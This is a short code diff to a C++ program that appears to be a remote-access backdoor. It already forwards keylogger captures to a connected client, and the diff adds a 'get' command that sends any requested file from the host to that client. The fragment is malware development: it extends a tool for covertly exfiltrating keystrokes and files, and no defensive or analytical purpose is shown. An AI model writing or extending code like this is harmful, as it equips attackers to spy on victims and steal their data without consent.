@@ -83,6 +83,9 @@ int main() {
         else if (cmd == "stop" && opt == "keylogger") {
             sendFile(client, keyloggerCapturePath);
         }
+        else if (opt == "get") {
+            sendFile(client, requestFilePath);
+        }
         
         // Close client socket
         cout << "\nClient disconnected!\n";
